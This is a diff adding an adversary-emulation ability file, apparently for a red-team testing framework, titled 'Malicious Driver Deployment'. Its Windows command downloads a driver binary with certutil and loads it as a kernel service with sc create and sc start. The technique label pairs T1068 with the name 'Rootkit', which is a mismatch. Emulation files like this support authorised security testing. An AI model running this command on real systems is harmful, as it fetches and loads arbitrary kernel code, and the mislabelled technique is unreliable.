@@ -1,0 +1,34 @@
+- id: 7f80bb6e-bbf6-46dd-b77d-ecef24f1c2cd
+  name: 6d5fbbb446b119cb151c97b8e16be822 - Malicious Driver Deployment
+  description: 'Malicious driver: 6d5fbbb446b119cb151c97b8e16be822
+
+    Category: vulnerable driver
+
+    Author: Michael Haag
+
+    Created: 2025-09-18
+
+    MITRE Technique: T1068'
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1068
+    name: Rootkit
+  platforms:
+    windows:
+      cmd:
+        command: 'certutil.exe -urlcache -split -f #{{6d5fbbb446b119cb151c97b8e16be822.bin}}
+          %TEMP%\6d5fbbb446b119cb151c97b8e16be822.bin && sc create MaliciousDriver
+          binPath= "%TEMP%\6d5fbbb446b119cb151c97b8e16be822.bin" type= kernel && sc
+          start MaliciousDriver'
+        payloads:
+        - 6d5fbbb446b119cb151c97b8e16be822.bin
+  singleton: true
+  privilege: Elevated
+  repeatable: false
+  buckets:
+  - privilege-escalation
+  version: '1.0'
+  author: Michael Haag
+  operating_system: Windows (Version Unspecified)
+  created: '2025-09-18'
+  modified: '2025-09-18'
